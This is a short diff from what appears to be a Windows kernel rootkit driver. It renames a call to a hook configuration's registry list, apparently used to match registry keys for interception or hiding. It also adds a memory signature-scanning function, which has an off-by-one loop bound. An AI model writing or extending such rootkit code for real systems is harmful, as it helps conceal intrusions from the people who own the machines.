@@ -138,7 +138,7 @@ NTSTATUS CheckReqForMatchRegisterInList(HANDLE keyHandle, OUT RegistryKey& key)
 		return key.registryLength == nameInfo->NameLength && (RtlCompareMemory(key.registryName, nameInfo->Name, key.registryLength) == key.registryLength);
 	};
 
-    key = RootkitHooksConfig::getInstance().getRegistryList().Find(finder);
+    key = RootkitHooksConfig::getInstance().GetRegistryList().Find(finder);
 
 	if (key.registryLength)
 	{
@@ -172,4 +172,18 @@ void PrintNonullStr(PWCHAR buffer, ULONGLONG length)
     buffer[length / 2 - 1] = 0;
     DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "%S\n", buffer);
     buffer[length / 2 - 1] = last;
+}
+
+ULONG_PTR findBySignature(PBYTE baseAddres, SIZE_T baseLenght, PBYTE pattern, SIZE_T patternLenght)
+{
+
+    for (SIZE_T i = 0; i < baseLenght - patternLenght; i++)
+    {
+        if (!memcmp((PBYTE)(baseAddres + i), pattern, patternLenght))
+        {
+            return (ULONG_PTR)baseAddres + i;
+        }
+    }
+
+    return {};
 }
